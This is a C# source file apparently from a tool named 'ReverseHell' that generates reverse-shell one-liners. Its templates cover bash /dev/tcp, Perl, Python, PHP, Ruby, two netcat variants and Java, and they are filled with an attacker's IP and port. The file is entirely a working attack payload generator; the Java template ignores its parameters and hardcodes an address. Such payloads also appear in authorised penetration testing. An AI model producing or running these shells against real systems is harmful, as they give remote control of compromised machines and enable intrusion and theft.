using System.Text;

namespace ReverseHell
{
    class ReverseShells
    {
        private static string BashReverseBlueprint { get; } = "bash -i >& /dev/tcp/{0}/{1} 0>&1";
        private static string PerlReverseBlueprint { get; } = "perl -e 'use Socket;$i=\"IP_ADDRESS\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
        private static string PythonReverseBlueprint { get; } = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
        private static string PHPReverseBlueprint { get; } = "php -r '$sock=fsockopen(\"{0}\",{1});exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
        private static string RubyReverseBlueprint { get; } = "ruby -rsocket -e'f=TCPSocket.open(\"{0}\", {1}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'";
        private static string NetcatReverseBlueprint { get; } = "nc -e /bin/sh {0} {1}";
        private static string NetcatReverseBlueprint2 { get; } = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f";
        private static string JavaReverseBlueprint { get; } = "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()";

        public static string GetBashShell(string ip, string port)
        {
            return string.Format(BashReverseBlueprint, ip, port);
        }

        //uses replace, because {} are used in the script, therefore .Format cannot decide where to put the parameters.
        public static string GetPerlShell(string ip, string port)
        {
            var shellCode = PerlReverseBlueprint.Replace("IP_ADDRESS", ip).Replace("PORT", port);
            return shellCode;
        }

        public static string GetPythonShell(string ip, string port)
        {
            return string.Format(PythonReverseBlueprint, ip, port);
        }

        public static string GetPHPShell(string ip, string port)
        {
            return string.Format(PHPReverseBlueprint, ip, port);
        }

        public static string GetRubyShell(string ip, string port)
        {
            return string.Format(RubyReverseBlueprint, ip, port);
        }

        private static string GetNetcat1Shell(string ip, string port)
        {
            return string.Format(NetcatReverseBlueprint, ip, port);
        }

        private static string GetNetcat2Shell(string ip, string port)
        {
            return string.Format(NetcatReverseBlueprint2, ip, port);
        }
        public static string GetNetcatShell(string ip, string port)
        {
            StringBuilder sb = new StringBuilder();
            sb.Append(GetNetcat1Shell(ip, port));
            sb.Append("\n\n");
            sb.Append(GetNetcat2Shell(ip, port));
            return sb.ToString();
        }

        public static string GetJavaShell(string ip, string port)
        {
            return string.Format(JavaReverseBlueprint, ip, port);
        }

    }
}